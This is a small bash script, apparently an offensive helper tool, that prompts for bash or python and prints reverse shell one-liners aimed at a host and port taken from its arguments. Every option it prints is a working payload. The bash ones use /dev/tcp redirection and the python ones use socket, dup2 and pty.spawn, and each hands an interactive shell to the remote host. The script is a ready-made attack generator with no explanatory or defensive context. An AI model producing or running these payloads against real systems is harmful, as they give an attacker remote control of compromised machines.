#!/bin/bash


echo  -e "1.bash\n2.python"  
echo "Select language"
read choice

if  [ "$choice" == "1" ]
then
echo ""
echo "bash -i >& /dev/tcp/$1/$2 0>&1"
echo ""
echo "bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'"
echo ""
echo "0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196"
echo ""
echo "/bin/bash -l > /dev/tcp/$1/$2 0<&1 2>&1"
echo ""

elif [ "$choice" == "2" ]
then
echo "export RHOST="$1";export RPORT=$2;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'"
echo ""
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"


fi

